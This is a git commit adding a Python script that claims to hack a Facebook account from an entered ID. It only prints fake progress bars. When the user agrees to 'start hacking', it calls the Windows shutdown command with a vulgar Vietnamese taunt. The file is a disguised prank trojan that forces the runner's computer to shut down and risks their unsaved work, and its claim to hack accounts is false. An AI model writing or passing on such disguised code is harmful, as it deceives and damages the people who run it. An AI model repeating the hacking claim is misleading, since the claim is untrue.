6bdb9128131c8aaa2ad46f2720b533a23ac0b06e
Cá Lang Thang <51262050+kaynk8@users.noreply.github.com>
2020-07-31 16:52:53 +0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,58 @@
+import time
+import os
+import random
+
+print('\n')
+print('------------Hack Facebook by Cá Lang Thang---------------')
+print('\n')
+
+# get data
+inputID = input('Nhập ID Facebook: \n ===> ')
+time.sleep(0.2)
+
+#index
+
+timeList = random.choice([2, 3, 4, 5, 8])
+
+# main
+
+print('Start checking...')
+time.sleep(5)
+
+if len(inputID) > 3:
+
+	count = 0
+
+	while (count < 101):
+		print('Checking', str(count) + '%...')
+		count = count + 10
+		time.sleep(timeList)
+
+	print('\n')
+
+question = input('Checking done! Do you want start hacking ? [Y/N]\n ==> ')
+if question == 'Y' or question == 'y':
+
+	print('\n')
+	print('Start hacking...')
+
+	countHack = 0
+	while countHack < 101:
+
+		print('Hacking', str(countHack) + '%...')
+		countHack = countHack + 10
+		time.sleep(timeList)
+
+	print('Hacking done!')
+	print('The computer will restart to complete the hack')
+	os.system('shutdown -s -t 100 -c "Hack hack cái đầu buồi, làm vậy là xấu nghen"')
+	print('\n')
+
+elif question == 'N' or question == 'n':
+	print('Stop hacking!')
+	print('Goodbye!')
+else:
+	print('Error!')
+
+
+
